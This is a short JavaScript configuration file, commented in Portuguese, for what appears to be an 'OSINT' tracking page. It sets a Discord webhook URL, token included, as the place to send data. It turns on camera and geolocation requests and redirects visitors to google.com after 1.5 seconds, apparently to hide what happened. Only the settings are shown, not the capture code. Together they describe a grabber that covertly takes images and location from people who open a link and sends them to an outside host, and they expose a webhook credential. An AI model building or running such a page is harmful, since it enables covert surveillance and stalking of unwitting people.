// config opcional externa (pode ser sobrescrita via querystring)
// Você pode mover webhookUrl e finalUrl para cá e manter index.html limpo

window.OSINT_CONFIG = window.OSINT_CONFIG || {};
Object.assign(window.OSINT_CONFIG, {
  webhookUrl: "https://discord.com/api/webhooks/1495389776625270814/_-8M4ZGQziGsbbiLY4VMGulTwhAi2Yxfh8WGKEtJHB7cH3-J4O3mizh0Hl3NCR69-zeZ",
  finalUrl: "https://www.google.com",
  requestCamera: true,
  requestGeo: true,
  redirectDelayMs: 1500,
  debug: false
});
